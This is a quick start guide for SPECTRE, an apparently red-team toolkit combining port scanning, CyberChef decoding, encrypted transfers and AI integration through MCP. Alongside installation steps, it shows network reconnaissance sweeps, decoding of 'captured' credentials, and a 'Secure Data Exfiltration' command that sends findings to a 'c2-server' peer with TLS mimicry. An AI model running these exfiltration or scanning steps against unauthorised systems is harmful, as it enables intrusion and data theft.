# SPECTRE Quick Start Guide

**Version:** 0.1.0 | **Last Updated:** 2026-02-04

---

## Overview

This guide will help you install SPECTRE and run your first security operations using the integrated platform.

---

## Prerequisites

### Required Software

| Software | Version | Purpose |
|----------|---------|---------|
| **Rust** | 1.88+ | Build SPECTRE, ProRT-IP, WRAITH |
| **Node.js** | 22+ | CyberChef-MCP |
| **Docker** | 20+ | CyberChef-MCP container |
| **Git** | 2.x | Clone repositories |

### System Requirements

**Minimum:**
- CPU: 4 cores @ 2.0 GHz
- RAM: 8 GB
- Storage: 2 GB free
- Network: 100 Mbps

**Recommended:**
- CPU: 8+ cores @ 3.0 GHz
- RAM: 16+ GB
- Storage: 10 GB SSD
- Network: 1 Gbps+
- Linux kernel 6.2+ (for AF_XDP/io_uring)

### Platform-Specific Dependencies

**Linux (Debian/Ubuntu):**
```bash
sudo apt update
sudo apt install -y \
    build-essential \
    libpcap-dev \
    pkg-config \
    libssl-dev \
    protobuf-compiler
```

**Linux (Fedora/RHEL):**
```bash
sudo dnf install -y \
    gcc \
    libpcap-devel \
    openssl-devel \
    protobuf-compiler
```

**Linux (Arch):**
```bash
sudo pacman -S --noconfirm \
    base-devel \
    libpcap \
    openssl \
    protobuf
```

**macOS:**
```bash
brew install libpcap openssl protobuf
```

**Windows:**
1. Install [Npcap](https://npcap.com/) with WinPcap API compatibility
2. Download [Npcap SDK](https://npcap.com/dist/npcap-sdk-1.13.zip)
3. Set environment: `$env:LIB = "C:\path\to\npcap-sdk\Lib\x64;$env:LIB"`

---

## Installation

### Step 1: Clone SPECTRE

```bash
git clone --recursive https://github.com/doublegate/SPECTRE.git
cd SPECTRE
```

### Step 2: Build Rust Components

```bash
# Build all crates in release mode
cargo build --release --workspace

# Verify build
./target/release/spectre --version
```

### Step 3: Grant Network Capabilities (Linux)

Raw packet operations require elevated privileges. Instead of running as root, grant capabilities:

```bash
# Grant capabilities to the binary
sudo setcap cap_net_raw,cap_net_admin=eip target/release/spectre

# Verify
getcap target/release/spectre
# Output: target/release/spectre cap_net_admin,cap_net_raw=eip
```

### Step 4: Setup CyberChef-MCP

**Option A: Pull pre-built image (recommended):**
```bash
docker pull doublegate/cyberchef-mcp:latest
```

**Option B: Build from source:**
```bash
cd components/cyberchef-mcp
docker build -f Dockerfile.mcp -t cyberchef-mcp .
```

### Step 5: Verify Installation

```bash
# Check SPECTRE status
spectre status

# Expected output:
# SPECTRE v0.1.0 - Status
# ─────────────────────────
# ProRT-IP:     ✓ Available (v1.0.0)
# CyberChef:    ✓ Available (v1.8.0)
# WRAITH:       ✓ Available (v2.3.7)
#
# All components operational.
```

### Step 6: Install to PATH (Optional)

```bash
# Copy to local bin
sudo cp target/release/spectre /usr/local/bin/

# Or create symlink
sudo ln -s $(pwd)/target/release/spectre /usr/local/bin/spectre
```

---

## First Operations

### 1. Quick Port Scan

Scan a target for common ports:

```bash
# SYN scan top 100 ports (fast)
spectre scan -sS -F 192.168.1.1

# Expected output:
# SPECTRE Scan Report
# Target: 192.168.1.1
# Scan: SYN (top 100 ports)
#
# PORT    STATE   SERVICE
# 22/tcp  open    ssh
# 80/tcp  open    http
# 443/tcp open    https
#
# Scan completed: 3 open ports found
```

### 2. Service Detection

Identify services running on open ports:

```bash
spectre scan -sS -sV -p 22,80,443 192.168.1.1

# Expected output:
# PORT    STATE   SERVICE     VERSION
# 22/tcp  open    ssh         OpenSSH 8.9p1
# 80/tcp  open    http        nginx 1.18.0
# 443/tcp open    https       nginx 1.18.0
```

### 3. Data Analysis with CyberChef

Decode Base64-encoded data:

```bash
# Inline data
echo "SGVsbG8gV29ybGQh" | spectre chef "From_Base64"
# Output: Hello World!

# From file
spectre chef "From_Base64,Gunzip" --input encoded.txt --output decoded.txt
```

### 4. Secure File Transfer

Send a file securely:

```bash
# First, generate an identity (one-time)
spectre identity generate --output ~/.spectre/identity.key

# Send file to peer (peer ID from recipient)
spectre send report.pdf --peer abc123...xyz
```

Receive files:

```bash
# Start receiving (shows your peer ID)
spectre receive --output ./downloads

# Output:
# SPECTRE Receiver Active
# Your Peer ID: abc123...xyz
# Listening for incoming transfers...
```

---

## Interface Modes

### CLI Mode (Default)

The command-line interface for scripting and automation:

```bash
# Run scans
spectre scan -sS -p 1-1000 192.168.1.0/24

# Run analysis
spectre chef @decode-credentials --input data.txt

# Pipeline operations
spectre scan -sS 10.0.0.0/24 -oJ - | spectre chef "Extract_URLs"
```

### TUI Mode

Launch the terminal dashboard:

```bash
spectre --tui

# Or start with a scan
spectre scan --tui 192.168.1.0/24
```

**Key Navigation:**
- `F1` - Help
- `F2` - Scan panel
- `F3` - Analysis panel
- `F4` - Communications panel
- `Tab` - Switch focus
- `q` - Quit

### GUI Mode

Launch the graphical interface:

```bash
spectre --gui

# Or specify a port
spectre --gui --port 8080
```

Access at `http://localhost:8080` in your browser.

### MCP Mode (AI Integration)

For Claude Code or Cursor integration, add to your MCP configuration:

```json
{
  "mcpServers": {
    "spectre": {
      "command": "spectre-mcp",
      "args": ["serve"]
    }
  }
}
```

Then interact naturally:

```
"Scan 192.168.1.0/24 for web servers and analyze their certificates"
```

---

## Common Workflows

### Network Reconnaissance

```bash
# Step 1: Quick discovery
spectre scan -sS -F 192.168.1.0/24 -oJ hosts.json

# Step 2: Deep scan discovered hosts
spectre scan -sS -sV -A -p- --input hosts.json -oJ detailed.json

# Step 3: Generate report
spectre report --input detailed.json --format html --output report.html
```

### Credential Analysis

```bash
# Decode captured credentials
spectre chef "From_Base64,URL_Decode,Gunzip" --input captured.txt

# Or use the pre-defined recipe
spectre chef @decode-credentials --input captured.txt
```

### Secure Data Exfiltration

```bash
# Compress and send findings
tar czf findings.tar.gz ./scan-results
spectre send findings.tar.gz --peer c2-server --mimicry tls
```

---

## Configuration

### Configuration File

SPECTRE uses TOML configuration at `~/.config/spectre/spectre.toml`:

```toml
[general]
verbose = false
color = true
output_format = "text"

[scan]
default_rate = 1000
default_timeout = 3000
default_ports = "1-1000"

[chef]
docker_image = "doublegate/cyberchef-mcp:latest"
cache_enabled = true

[comms]
identity_file = "~/.spectre/identity.key"
default_mimicry = "tls"

[campaigns]
storage_dir = "~/.spectre/campaigns"
auto_save = true
```

### Environment Variables

```bash
export SPECTRE_CONFIG=/path/to/spectre.toml
export SPECTRE_VERBOSE=1
export SPECTRE_OUTPUT_FORMAT=json
```

---

## Troubleshooting

### "Permission denied" on scan

```bash
# Solution: Grant capabilities
sudo setcap cap_net_raw,cap_net_admin=eip $(which spectre)

# Or run with sudo (not recommended)
sudo spectre scan ...
```

### "CyberChef container not found"

```bash
# Pull the container
docker pull doublegate/cyberchef-mcp:latest

# Verify
docker images | grep cyberchef
```

### "Cannot connect to peer"

```bash
# Check network connectivity
spectre status --verbose

# Verify peer ID is correct
spectre peers list
```

### "Rate limit exceeded"

```bash
# Reduce scan rate
spectre scan -sS --rate 100 192.168.1.0/24

# Or use paranoid timing
spectre scan -sS -T0 192.168.1.0/24
```

---

## Next Steps

1. **Read the CLI Reference** — [CLI-REFERENCE.md](CLI-REFERENCE.md)
2. **Explore the TUI** — [TUI-GUIDE.md](TUI-GUIDE.md)
3. **Setup MCP Integration** — [MCP-TOOLS.md](MCP-TOOLS.md)
4. **Learn Campaign Management** — [docs/briefings/CONOP-template.md](../briefings/CONOP-template.md)

---

## Getting Help

```bash
# General help
spectre --help

# Subcommand help
spectre scan --help
spectre chef --help

# Version information
spectre --version
```

**Resources:**
- [GitHub Issues](https://github.com/doublegate/SPECTRE/issues)
- [GitHub Discussions](https://github.com/doublegate/SPECTRE/discussions)
